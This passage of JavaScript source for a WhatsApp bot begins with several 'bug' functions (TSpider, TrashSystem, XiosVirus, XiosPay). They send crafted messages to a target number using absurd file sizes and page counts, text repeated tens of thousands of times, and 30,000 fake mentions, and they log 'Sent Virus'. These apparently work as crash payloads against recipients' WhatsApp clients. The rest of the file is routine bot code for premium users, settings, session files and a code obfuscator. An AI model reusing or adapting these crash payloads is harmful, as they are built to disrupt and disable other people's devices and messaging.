							conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
							conversionDelaySeconds: 10,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: " p ",
								mediaType: "IMAGE",
								jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								caption: " p "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "̟",
								body: "̟",
								mediaType: "VIDEO",
								renderLargerThumbnail: true,
								previewType: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " p ",
								sourceId: " p ",
								sourceUrl: "p",
								mediaUrl: "p",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "p"
							},
							groupSubject: " p ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " p ",
							trustBannerAction: 1,
							issampled: false,
							utm: {
								utmSource: " p ",
								utmCampaign: " p "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " p ",
								contentType: "UPDATE",
								accessibilityText: " p "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("bot Sent Virus ✅"));
		};
    //========================
    async function TSpider(target, pic, Ptcp = true) {
   await LostBoyTechInc.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "᳀ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 メ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: pic,
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "🏴‍☠️ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 🦣\n" + "@6285655649546".repeat(17000),
        },
        nativeFlowMessage: {
         buttons: [{
           name: "cta_url",
           buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐒𝐩𝐢𝐝𝐞𝐫 𝐂𝐫𝐚𝐬𝐡 ϟ〽️', url: \"https://youtube.com/king_sam_hub\", merchant_url: \"https://youtube.com/king_sam_hub\" }",
          },
          {
           name: "call_permission_request",
           buttonParamsJson: "{}",
          },
         ],
         messageParamsJson: "{}",
        },
        contextInfo: {
         mentionedJid: ["6285655649546@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9〽️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
   console.log(chalk.green("Send Bug By Spider〽️"));
  };
async function TrashSystem(target, spider, Ptcp = true) {
   await LostBoyTechInc.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "᳀ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 メ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: spider,
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "🏴‍☠️ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 🦣\n" + "@6285655649546".repeat(17000),
        },
        contextInfo: {
         mentionedJid: ["6285655649546@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9〽️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: spider,
          },
         },
        },
       },
      },
     },
    },
    ptcp ? { participant: { jid: target } } : {}
    );
};
async function XiosVirus(jid) {
			LostBoyTechInc.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': '⭑̤⟅̊༑ ▾ ⋆✩⋆ 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐫 𝐕𝟓 𝐕𝐢𝐩 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
			console.log(chalk.red("Succes Send Bug"));
		};

		async function XiosPay(jid) {
			LostBoyTechInc.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.red("Succes Send Bug"));
		};

//===================°°
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285624297893:+62 856-2429-7893\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
//end bug functions

async function loading () {
var xeonlod = [
"《 𝕷𝖔𝖘𝖙𝖇𝖔𝖞》10%",
"《 𝖝》30%",
"《 𝖑𝖔𝖗𝖉 𝖙𝖊𝖈𝖍》50%",
"《 =》80%",
"《 𝖈𝖘𝖚𝖎𝖙》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
]
let { key } = await LostBoyTechInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await LostBoyTechInc.sendMessage(from, {text: xeonlod[i], edit: key });
}
}

        if (!LostBoyTechInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            LostBoyTechInc.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        LostBoyTechInc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        LostBoyTechInc.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        LostBoyTechInc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        LostBoyTechInc.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            LostBoyTechInc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('91') && global.anti91 === true) {
            return LostBoyTechInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await LostBoyTechInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await LostBoyTechInc.getName(i)}\nFN:${await LostBoyTechInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	//JS OBFUSCATOR 
	async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `LOSTBOY`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./dtbs/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./dtbs/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./C-SMedia/audio/${BhosdikaXeon}.mp3`)
LostBoyTechInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./C-SMedia/sticker/${BhosdikaXeon}.webp`)
LostBoyTechInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageCsuit){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./C-SMedia/image/${BhosdikaXeon}.jpg`)
LostBoyTechInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./C-SMedia/video/${BhosdikaXeon}.mp4`)
LostBoyTechInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
LostBoyTechInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./C-SMedia/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
LostBoyTechInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./C-SMedia/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./C-SMedia/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replyCsuit(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./dtbs/afk-user.json', JSON.stringify(_afk))
                LostBoyTechInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'addprem':
                if (!isCreator) return replyCsuit(mess.owner)
                if (args.length < 2)
                    return replyCsuit(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replyCsuit("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replyCsuit("Success")
                }
                break
                case 'enc': case 'encrypt': case 'obfuscate':
{
if (!isCreator) return replyCsuit(`Example ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
replyCsuit(`${meg.result}`)
}
break
            case 'delprem':
                if (!isCreator) return replyCsuit(mess.owner)
                if (args.length < 1) return replyCsuit(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./dtbs/premium.json", JSON.stringify(premium));
                    }
                    replyCsuit("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./dtbs/premium.json", JSON.stringify(premium));
                    replyCsuit("Success")
                }
                break
            case 'listprem': {
                if (!isCreator) return replyCsuit(mess.owner)
                let data = require("./dtbs/premium.json")
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Number : ${i.id}\n`
                    txt += `Expired : ${i.expired} Second\n`         
                }                
                LostBoyTechInc.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return replyCsuit(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replyCsuit('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replyCsuit(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replyCsuit(teks)
                    await sleep(2000)
                    replyCsuit("Delete junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replyCsuit("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!isCreator) return replyCsuit(mess.owner)
                    if (!text) return replyCsuit('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replyCsuit('Link Invalid!')
                    replyCsuit(mess.wait)
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await LostBoyTechInc.groupAcceptInvite(result).then((res) => replyCsuit(json(res))).catch((err) => replyCsuit(json(err)))
                } catch {
                    replyCsuit('Failed to join the Group')
                }
                break      
            case 'getsession':
                if (!isCreator) return replyCsuit(mess.owner)
                replyCsuit('Wait a moment, currently retrieving your session file')
                let sesi = await fs.readFileSync('./session/creds.json')
                LostBoyTechInc.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
            case 'shutdown':
                if (!isCreator) return replyCsuit(mess.owner)
                replyCsuit(`Goodbye🖐`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return replyCsuit(mess.owner)
                replyCsuit('In Process....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return replyCsuit(mess.owner)
                if (args.length < 1) return replyCsuit(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replyCsuit(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replyCsuit(`Successfully changed autoread to ${q}`)
                }
                break
                case 'autotyping':
                if (!isCreator) return replyCsuit(mess.owner)
                if (args.length < 1) return replyCsuit(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    replyCsuit(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replyCsuit(`Successfully changed auto-typing to ${q}`)
                }
                break
                case 'autorecording':
                if (!isCreator) return replyCsuit(mess.owner)
                if (args.length < 1) return replyCsuit(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    replyCsuit(`Successfully changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replyCsuit(`Successfully changed auto-recording to ${q}`)
                }
                break
                case 'autorecordtyp':
                if (!isCreator) return replyCsuit(mess.owner)
                if (args.length < 1) return replyCsuit(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    replyCsuit(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    replyCsuit(`Successfully changed auto recording and typing to ${q}`)
                }
                break
                case 'autoswview':
    case 'autostatusview':{
             if (!isCreator) return replyCsuit(mess.owner)
               if (args.length < 1) return replyCsuit('on/off?')
               if (args[0] === 'on') {
                  autoswview = true
                  replyCsuit(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replyCsuit(`${command} is disabled`)
               }
            }
            break
            case 'autobio':
                if (!isCreator) return replyCsuit(mess.owner)
                if (args.length < 1) return replyCsuit(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replyCsuit(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replyCsuit(`Successfully Changed AutoBio To ${q}`)
                }
                break
            case 'mode':
                if (!isCreator) return replyCsuit(mess.owner)
                if (args.length < 1) return replyCsuit(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    LostBoyTechInc.public = true
                    replyCsuit(mess.done)
                } else if (q == 'self') {
                    LostBoyTechInc.public = false
                    replyCsuit(mess.done)
                }
                break
            case 'setexif':
                if (!isCreator) return replyCsuit(mess.owner)
                if (!text) return replyCsuit(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replyCsuit(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
            case 'setpp':
            case 'setpp':
            case 'setppbot':
